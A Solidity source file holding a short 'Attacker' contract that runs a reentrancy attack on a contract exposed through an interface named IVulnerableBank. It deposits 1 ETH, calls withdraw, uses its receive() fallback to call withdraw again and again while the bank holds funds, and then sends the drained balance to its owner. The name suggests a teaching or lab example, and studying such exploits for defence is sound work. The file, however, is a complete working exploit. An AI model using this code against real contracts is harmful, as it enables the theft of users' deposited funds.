// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint _amount) external;
}

contract Attacker {
    address public owner;
    IVulnerableBank public bank;
    uint public attackAmount = 1 ether;

    constructor(address _bankAddress) {
        owner = msg.sender;
        bank = IVulnerableBank(_bankAddress);
    }

    // Получаем ETH и снова вызываем withdraw
    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdraw(attackAmount);
        }
    }

    function attack() external payable {
        require(msg.value >= attackAmount, "Need at least 1 ETH");
        bank.deposit{value: attackAmount}();
        bank.withdraw(attackAmount);
    }

    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }
}
